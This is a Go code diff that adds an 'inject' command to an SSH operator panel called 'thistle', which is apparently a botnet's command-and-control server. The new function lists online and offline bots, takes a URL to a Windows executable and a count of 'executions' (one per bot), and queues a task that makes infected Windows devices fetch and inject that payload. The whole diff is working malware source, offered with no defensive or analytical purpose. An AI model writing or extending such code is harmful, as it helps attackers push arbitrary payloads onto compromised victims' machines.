@@ -23,6 +23,49 @@ func randomString(length int) string {
 	return string(result)
 }
 
+func inject(channel ssh.Channel) {
+	db.Exec("UPDATE devices SET status = 'offline' WHERE lastping < strftime('%s', 'now') - 30")
+	online, offline, total := GetCounts()
+	fmt.Fprintf(channel, "\033]0;thistle - Total ["+total+"] Online ["+online+"] Offline ["+offline+"].\007")
+	displayMenu(channel)
+	fmt.Fprintln(channel, "You have selected: inject")
+	fmt.Fprintln(channel, "Please enter the URL you wish for devices to inject.\nDirect URL is needed. .exe and x64 files only, type exit if you do not wish to run this command.")
+	fmt.Fprint(channel, "-> ")
+	url, err := getUserInput(channel)
+	if err != nil {
+		log.Fatal(err)
+	}
+	if url == "exit" {
+		return
+	}
+	fmt.Fprintln(channel, "Chosen URL: ", url)
+	fmt.Fprintln(channel, "Please enter the amount of executions you wish for, 1 task exec = 1 bot")
+	fmt.Fprint(channel, "-> ")
+	executions, err := getUserInput(channel)
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Fprintln(channel, "Chosen executions: ", executions)
+	win, _, _, err := GetDeviceCounts(db)
+	if err != nil {
+		fmt.Println(err)
+	}
+	fmt.Fprintf(channel, "Devices Available: Windows:%s", win)
+
+	filter := "win"
+	fmt.Fprintln(channel, "Chosen filter: ", filter)
+	fmt.Fprintln(channel, "Command: download", " Executions: ", executions, " Filters: ", filter)
+	converted, _ := strconv.Atoi(executions)
+	_, err = db.Exec("INSERT INTO tasks(taskid, command, url, executions_h, executions_n, filters, created, status) VALUES(?,?,?,?,?,?,?,?)", "inject-"+randomString(5), "inject", url, 0, converted, filter, time.Now().Unix(), "active")
+	if err != nil {
+		fmt.Println(err)
+	}
+	time.Sleep(4 * time.Second)
+	clearTerminal(channel)
+	displayMenu(channel)
+
+}
+
 func download(channel ssh.Channel) {
 	db.Exec("UPDATE devices SET status = 'offline' WHERE lastping < strftime('%s', 'now') - 30")
 	online, offline, total := GetCounts()
